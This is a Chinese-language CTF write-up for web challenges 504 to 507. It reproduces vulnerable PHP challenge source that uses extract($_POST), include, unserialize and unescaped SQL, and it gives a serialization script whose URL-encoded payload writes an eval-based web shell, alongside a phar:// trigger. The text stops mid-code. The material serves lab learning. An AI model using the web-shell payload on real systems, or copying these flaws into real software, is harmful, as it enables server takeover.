<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413223917170.png" alt="image-20220413223917170"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">db_format=img/ee6d68225691981a53cadf2f11b187a7.jpg&amp;pre=phar:<span class="comment">///var/www/html/</span></span><br></pre></td></tr></table></figure>

<p>记住使用phar:&#x2F;&#x2F;协议哦</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413224734911.png" alt="image-20220413224734911"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413224744176.png" alt="image-20220413224744176"></p>
<h1 id="web504"><a href="#web504" class="headerlink" title="web504"></a>web504</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414104704841.png" alt="image-20220414104704841"></p>
<p>这里也是搜到一个模板php,但是这里读取不了源码了</p>
<p>我们查看一下抓个包试试</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414105156834.png" alt="image-20220414105156834"></p>
<p>可以看到这里访问的index.sml文件.我们试试有没有文件遍历</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414105404649.png" alt="image-20220414105404649"></p>
<p>可见查询失败</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414105530888.png" alt="image-20220414105530888"></p>
<p>下载这里也是一样</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414105605711.png" alt="image-20220414105605711"></p>
<p>新增模板呢</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414105811237.png" alt="image-20220414105811237"></p>
<p>上传成功.我们试试.php文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414105901789.png" alt="image-20220414105901789"></p>
<p>&#x2F;api&#x2F;admin_settings.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 15:50:14</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-16 16:26:31</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="variable">$config</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>复习一个这个文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> =<span class="string">&#x27;&lt;?php @eval($_POST[zf]);?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span> =<span class="string">&quot;./zf.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;;user=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#;user=O%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A26%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bzf%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A8%3A%22.%2Fzf.php%22%3B%7D</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414112216286.png" alt="image-20220414112216286"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414112259433.png" alt="image-20220414112259433"></p>
<p>可见已经反序列化了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414113103225.png" alt="image-20220414113103225"></p>
<h1 id="web505"><a href="#web505" class="headerlink" title="web505"></a>web505</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414121330746.png" alt="image-20220414121330746"></p>
<p>这次发现又多了一个文件查看</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414121359533.png" alt="image-20220414121359533"></p>
<p>发现可以看到源码.我们看下新加的文件</p>
<p>api&#x2F;admin_file_view.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-24 00:53:45</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-24 02:49:36</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查看成功&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414122321538.png" alt="image-20220414122321538"></p>
<p>先传一个文件上去</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414123323733.png" alt="image-20220414123323733"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414123406853.png" alt="image-20220414123406853"></p>
<h1 id="web506"><a href="#web506" class="headerlink" title="web506"></a>web506</h1><p>api&#x2F;admin_file_view.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-24 00:53:45</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-24 02:49:36</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>)-<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|sml|phar/i&#x27;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请不要使用此功能&#x27;</span>;</span><br><span class="line">		<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查看成功&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414124910368.png" alt="image-20220414124910368"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414125413444.png" alt="image-20220414125413444"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414125540070.png" alt="image-20220414125540070"></p>
<h1 id="web507"><a href="#web507" class="headerlink" title="web507"></a>web507</h1><p>api&#x2F;admin_file_view.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-24 00:53:45</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-24 02:49:36</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>)-<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|sml|phar/i&#x27;</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请不要使用此功能&#x27;</span>;</span><br><span class="line">		<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$debug</span>==<span class="number">1</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^user/&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$f</span>)))&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$f</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../&#x27;</span>.<span class="variable">$name</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查看成功&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>api&#x2F;admin_templates.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-19 18:49:54</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-24 00:33:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$user</span>))&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select id,name,type,path,des from templates limit 0,10&quot;</span>;</span><br><span class="line">		<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="variable">$temps</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>);</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="variable">$temps</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="variable">$row</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$row</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span> =<span class="string">&quot;update templates set name=&#x27;<span class="subst">&#123;$row-&gt;name&#125;</span>&#x27;,path=&#x27;<span class="subst">&#123;$row-&gt;path&#125;</span>&#x27;,type=&#x27;<span class="subst">&#123;$row-&gt;type&#125;</span>&#x27;,des=&#x27;<span class="subst">&#123;$row-&gt;des&#125;</span>&#x27; where id =<span class="subst">&#123;$row-&gt;id&#125;</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新成功&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;getContents&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="variable">$template</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$template</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$template</span>-&gt;path))&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$template</span>-&gt;path)));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$path</span>))&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>); </span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:  attachment; filename=&quot;&#x27;</span> . <span class="variable">$path</span>. <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|phar|ini|settings/i&#x27;</span>, <span class="variable">$name</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#x27;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$name</span>, <span class="variable">$content</span>);</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="comment"># code...</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$row</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;name))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;type))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;des))&#123;</span><br><span class="line">		<span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span 